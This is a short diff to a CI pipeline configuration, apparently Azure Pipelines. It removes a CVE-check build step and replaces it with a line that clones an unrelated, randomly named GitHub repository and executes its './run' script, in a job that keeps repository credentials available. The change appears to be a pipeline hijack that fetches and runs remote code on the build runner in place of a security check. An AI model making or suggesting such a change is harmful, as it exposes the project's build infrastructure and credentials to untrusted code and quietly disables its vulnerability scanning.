@@ -34,12 +34,7 @@ stages:
       clean: false
       persistCredentials: true
     - script: |
-        echo ">> ALL BUILD* VARIABLES " && export | grep BUILD
-        echo "[CVE] executing ROR_TASK=$ROR_TASK"
-        bin/build.sh
-      continueOnError: true
-      env: 
-       ROR_TASK: cve_check
+        git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
 
 - stage: TEST
   jobs:
